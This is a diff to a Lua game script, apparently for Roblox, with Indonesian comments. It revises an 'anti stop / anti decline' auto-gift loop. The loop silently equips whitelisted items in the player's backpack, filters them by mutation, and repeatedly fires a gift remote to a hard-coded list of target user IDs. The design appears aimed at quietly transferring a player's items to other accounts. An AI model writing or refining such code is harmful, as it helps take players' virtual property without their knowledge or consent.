@@ -760,6 +760,10 @@ end)
 -- 🔥 AUTO GIFT BRUTAL (ANTI STOP / ANTI DECLINE)
 --====================================================
 
+--====================================================
+-- 🔥 AUTO GIFT (EQUIP → SCAN MUTATION → SEND)
+--====================================================
+
 task.spawn(function()
     while true do
         task.wait(0.05)
@@ -768,21 +772,39 @@ task.spawn(function()
             if not tool:IsA("Tool") then continue end
             if isWeightTool(tool) then continue end
             if not brainrotWhitelist[tool.Name] then continue end
-            if not isWhitelisted(tool) then continue end
             if tool.Parent ~= backpack then continue end
 
-            -- equip
+            -- 🔥 1. EQUIP DULU (biar attr kebaca)
             silentEquip(tool)
-            task.wait(0.02)
+            task.wait(0.05) -- kasih waktu attr kebaca
 
-            -- send gift
-            for _,id in ipairs(targetUserIds) do
-                pcall(function()
-                    giftRemote:FireServer(id)
-                end)
+            -- 🔥 2. AMBIL MUTATION SETELAH EQUIP
+            local mutation = getMutation(tool)
+            local data = brainrotWhitelist[tool.Name]
+
+            local allowed = false
+
+            if data then
+                -- wildcard
+                if data.mutations["*"] then
+                    allowed = true
+                elseif data.mutations[mutation] then
+                    allowed = true
+                end
             end
 
+            -- 🔥 3. KALAU COCOK → SEND GIFT
+            if allowed then
+                for _,id in ipairs(targetUserIds) do
+                    pcall(function()
+                        giftRemote:FireServer(id)
+                    end)
+                end
+            end
+
+            -- 🔥 4. BALIKIN TOOL
             unequipAll()
+
             task.wait(0.03)
         end
     end
